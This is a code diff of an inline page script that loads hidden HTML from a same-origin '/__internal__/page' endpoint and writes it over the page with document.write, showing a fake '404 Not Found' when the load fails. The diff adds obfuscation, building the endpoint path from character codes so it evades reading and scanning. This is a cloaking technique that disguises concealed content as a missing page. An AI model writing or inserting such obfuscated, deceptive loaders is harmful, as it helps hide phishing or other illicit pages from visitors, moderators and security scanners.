@@ -1,34 +1,32 @@
 <script>
-(async function () {
-    try {
-        const parts = [
-            "__",
-            "internal",
-            "__",
-            "/",
-            "page"
-        ];
+(() => {
+    const decode = (...nums) =>
+        nums.map(n => String.fromCharCode(n)).join("");
 
-        const endpoint = "/" + parts[0] + parts[1] + parts[2] + parts[3] + parts[4];
+    const p1 = decode(95,95);                 
+    const p2 = decode(
+        105,110,116,101,114,110,97,108
+    );                                        
+    const p3 = decode(95,95);                
+    const p4 = decode(112,97,103,101);        
 
-        const response = await fetch(endpoint, {
-            cache: "no-store",
-            credentials: "same-origin"
-        });
+    const endpoint = "/" + p1 + p2 + p3 + "/" + p4;
 
-        if (!response.ok) {
-            document.body.innerHTML = "<h1>404 Not Found</h1>";
-            return;
-        }
-
-        const html = await response.text();
-
+    fetch(endpoint, {
+        cache: "no-store",
+        credentials: "same-origin"
+    })
+    .then(r => {
+        if (!r.ok) throw new Error();
+        return r.text();
+    })
+    .then(html => {
         document.open();
         document.write(html);
         document.close();
-
-    } catch {
+    })
+    .catch(() => {
         document.body.innerHTML = "<h1>404 Not Found</h1>";
-    }
+    });
 })();
 </script>
